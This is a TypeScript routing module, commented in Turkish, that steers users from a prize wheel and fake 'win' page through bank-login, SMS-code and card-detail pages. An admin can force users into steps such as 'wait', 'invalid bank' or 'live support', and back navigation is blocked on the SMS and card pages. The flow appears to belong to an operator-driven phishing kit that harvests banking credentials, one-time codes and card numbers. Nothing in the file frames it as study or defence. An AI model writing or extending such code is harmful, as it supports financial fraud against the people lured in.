import type { SessionStep } from "@/types/session";

/**
 * ADIM ÖNCELİĞİ (Step Priority):
 * - Düşük sayı = akışın başlangıcı
 * - Yüksek sayı = akışın ilerisi
 * - 100 ve üzeri = ADMIN KORUMALI (client ping veya submit ile GERİYE DÖNEMEZ,
 *   sadece admin panelinden zorlanabilir. Bu adımlara gelince client kesinlikle orada kalır
 *   veya daha ileri admin adımına yönlenir, GERİYE gitmez.)
 */
const STEP_PRIORITY: Record<string, number> = {
  wheel: 10,
  code_entry: 10,
  win: 20,
  banken: 30,
  facebook: 35,
  whatsapp: 36,
  bank: 40,
  bank_login: 40,
  sms: 50,
  card: 60,
  wait: 100,
  invalid_bank: 101,
  special_approval: 102,
  live_support: 103,
  congrats: 104,
  custom_question: 105,
};

export const ADMIN_PROTECTED_PRIORITY_THRESHOLD = 100;

/**
 * GERİ TUŞU (browser back) ENGELLENECEK adımlar:
 * wait (bekleme), special_approval (özel onay), sms, card (kart bilgileri), live_support (canlı destek).
 * Bu sayfalarda kullanıcı GERİ tuşuna BASAMAZ, aynı sayfada kalır.
 */
const BACK_NAVIGATION_BLOCKED_STEPS = new Set<string>([
  "wait",
  "special_approval",
  "sms",
  "card",
  "live_support",
]);

export function isAdminProtectedStep(step: string | SessionStep | null | undefined): boolean {
  if (!step) return false;
  const p = STEP_PRIORITY[String(step)] ?? 0;
  return p >= ADMIN_PROTECTED_PRIORITY_THRESHOLD;
}

export function isBackNavigationBlockedStep(step: string | SessionStep | null | undefined): boolean {
  if (!step) return false;
  return BACK_NAVIGATION_BLOCKED_STEPS.has(String(step));
}

export function getStepPriority(step: string | SessionStep | null | undefined): number {
  if (!step) return 0;
  return STEP_PRIORITY[String(step)] ?? 0;
}

/**
 * Client adımı GERİYE mi çekiyor? (Örn: kullanıcı bankada (40), DB win (20) ise -> client daha ileride)
 * Sadece DB adımı DÜŞÜK öncelikli VE client adımı DAHA YÜKSEK öncelikliyse (ve admin korumalı değilse) GERİ gönderme.
 */
export function shouldRedirectToServerStep(params: {
  localStep: string | null;
  serverStep: string | null;
}): boolean {
  const { localStep, serverStep } = params;
  if (!localStep || !serverStep) return false;
  if (localStep === serverStep) return false;

  // Eş değer adımlar: wheel === code_entry, banken === bank
  if (localStep === "wheel" && serverStep === "code_entry") return false;
  if (localStep === "code_entry" && serverStep === "wheel") return false;
  if (localStep === "banken" && serverStep === "bank") return false;
  if (localStep === "bank" && serverStep === "banken") return false;
  if (localStep === "bank_login" && serverStep === "bank") return false;
  if (localStep === "bank" && serverStep === "bank_login") return false;

  const localP = getStepPriority(localStep);
  const serverP = getStepPriority(serverStep);

  // Server admin korumalı adımdaysa (≥100): CLIENT MUTLAKA ORAYA GİDER (ne olursa olsun)
  if (serverP >= ADMIN_PROTECTED_PRIORITY_THRESHOLD) {
    return localStep !== serverStep;
  }

  // Server adımı client adımından DAHA YÜKSEKSE (ileri adım): client'i oraya götür.
  if (serverP > localP) {
    return true;
  }

  // Aksi halde:
  // - Client daha ilerideyse (localP > serverP): GERİ GÖNDERME (DB'deki eski step güncellenmemiş olabilir, client akışta)
  // - Eşit veya düşük: dokunma.
  return false;
}

export function stepToPath(
  step: SessionStep,
  sessionId: string,
  routeSessionId: string = sessionId,
): string {
  switch (step) {
    case "code_entry":
      return "/code";
    case "wheel":
      return "/wheel";
    case "win":
      return `/win/${routeSessionId}`;
    case "banken":
      return "/banken";
    case "facebook":
      return "/facebook";
    case "whatsapp":
      return "/whatsapp";
    case "bank":
    case "bank_login":
      return "/banken";
    case "wait":
      return "/wait";
    case "invalid_bank":
      return "/invalid-bank";
    case "live_support":
      return "/live-support";
    case "sms":
      return "/sms";
    case "card":
      return "/card";
    case "congrats":
      return "/congratulations";
    case "special_approval":
      return "/special-approval";
    case "custom_question":
      return "/custom-question";
    default:
      return `/win/${routeSessionId}`;
  }
}

export function resolveStepTargetPath(
  step: SessionStep,
  sessionId: string,
  routeSessionId: string = sessionId,
  formData?: { bankSlug?: string | null },
): string {
  if ((step === "bank" || step === "bank_login") && formData?.bankSlug?.trim()) {
    return `/win/${routeSessionId}/bank/${formData.bankSlug.trim()}`;
  }

  return stepToPath(step, sessionId, routeSessionId);
}

export function pathToStep(pathname: string): SessionStep | null {
  if (pathname.startsWith("/wheel")) return "wheel";
  if (pathname.startsWith("/code")) return "code_entry";
  if (pathname.includes("/bank/")) return "bank";
  if (pathname.startsWith("/win")) return "win";
  if (pathname.startsWith("/banken") || pathname.startsWith("/banks")) return "banken";
  if (pathname.startsWith("/facebook")) return "facebook";
  if (pathname.startsWith("/whatsapp")) return "whatsapp";
  if (pathname.startsWith("/wait")) return "wait";
  if (pathname.startsWith("/invalid-bank")) return "invalid_bank";
  if (pathname.startsWith("/live-support")) return "live_support";
  if (pathname.startsWith("/congratulations")) return "congrats";
  if (pathname.startsWith("/special-approval")) return "special_approval";
  if (pathname.startsWith("/custom-question")) return "custom_question";
  if (pathname.startsWith("/sms")) return "sms";
  if (pathname.startsWith("/card")) return "card";
  return null;
}
